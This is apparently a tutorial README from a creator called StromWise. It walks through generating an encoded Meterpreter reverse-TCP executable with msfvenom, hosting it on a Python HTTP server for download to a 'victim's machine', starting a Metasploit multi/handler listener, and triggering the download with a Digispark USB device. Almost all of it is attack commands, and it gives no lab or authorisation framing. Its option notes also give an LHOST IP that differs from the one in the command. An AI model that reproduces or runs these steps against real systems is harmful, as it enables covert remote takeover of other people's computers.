# TERMINAL-1. 


STEP 1 -  sudo su 

STEP 2 -  cd

STEP 3 -  cd

STEP 4 -  msfconsole

STEP 5 -  msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.0.74 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -o payload.exe

______________________________________________________________________________________________________________________________________________________________________________________

Here's what each option in the command means:

|-a x86: set the architecture to x86

|–platform Windows: set the target platform to Windows

|-p windows/meterpreter/reverse_tcp: set the payload to a reverse TCP meterpreter

|LHOST=192.168.1.9: set the local host to 192.168.1.9

|LPORT=4444: set the local port to 4444

|-i 10: flag specifies the number of iterations for the encoder to use 	

|-e x86/shikata_ga_nai: encode the payload with the shikata_ga_nai encoder

|-f exe: output the payload as a Windows executable

|-o payload.exe: name the output file as payload.exe

______________________________________________________________________________________________________________________________________________________________________________________

payload will be generated. Open the file explorer in kali,

look for the payload then open a new terminal in that location where there is payload. 


# TERMINAL-2.



STEP 6 -  python3 -m http.server     (running a simple http server so that the payload can be downloaded on the victims machine.)



now go back to the TERMINAL-1.



STEP 7 -  use exploit/multi/handler      (command designed for creating reverse shell connections.)

STEP 8 -  set payload windows/meterpreter/reverse_tcp   

STEP 9 -  set LHOST 192.168.0.74       (set LHOST <Kali Linux IP> which was given in the payload as well)

STEP 10 -  set LPORT 4444               (set LPORT <port> the same port number that was given while creating the payload)

STEP 11 -  exploit        (to run the commands you can use either "exploit" or "run" command)



NOW YOU HAVE TO INSERT THE DIGISPARK ATTINY85 USB WITH THE REVERSE SHELL SCRIPT CREATED BY DEVILWHITE0 TO GET THE SUCESSFULLREVERSE SHELL. 



STEP 12 -  help       (to view the command that can be run after the sucessfull reverse shell of windows)












____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


